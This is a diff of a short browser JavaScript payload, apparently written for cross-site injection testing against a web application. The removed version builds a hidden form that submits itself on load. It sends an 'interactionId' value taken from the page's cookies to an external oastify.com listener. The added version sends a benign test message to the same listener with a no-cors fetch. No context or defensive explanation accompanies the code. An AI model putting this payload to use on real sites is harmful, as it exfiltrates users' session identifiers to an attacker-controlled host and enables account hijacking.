@@ -1,35 +1,14 @@
-function sendPostWithoutFetch() {
-    const url = "https://mxnsskj6e98b6ppkq7vv2j4y6pcg09oy.oastify.com";
-
-    // 1. Create a form element
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = url;
-    form.style.display = 'none';
-
-    // 2. Create an input to hold your JSON data
-    // Note: Some APIs expect a raw body, but standard forms send as 'key=value'
-    const input = document.createElement('input');
-    input.type = 'hidden';
-    input.name = 'data'; // You may need to check if the server accepts form-encoded JSON
-    input.value = JSON.stringify({
-        "nextEvent": {
-            "constructType": "skEvent",
-            "eventName": "continue",
-            "params": [],
-            "eventType": "post",
-            "postProcess": {}
-        },
-        "eventName": "continue",
-        "id": "b0qyqlpiyz",
-        "interactionId": document.cookie.split('interactionId=')[1]?.split(';')[0]
-    });
-
-    form.appendChild(input);
-    document.body.appendChild(form);
-
-    // 3. Submit the form
-    form.submit();
-}
-
-sendPostWithoutFetch();
+// Simple fetch request to your Oastify listener
+fetch('https://mxnsskj6e98b6ppkq7vv2j4y6pcg09oy.oastify.com', {
+    method: 'POST', // Sending as a POST
+    mode: 'no-cors', // Ensures it fires even if the server doesn't send CORS headers
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        message: "Hello from Site A",
+        timestamp: new Date().toISOString()
+    })
+})
+.then(() => console.log("✅ Fetch sent successfully."))
+.catch((err) => console.log("❌ Fetch failed: ", err));
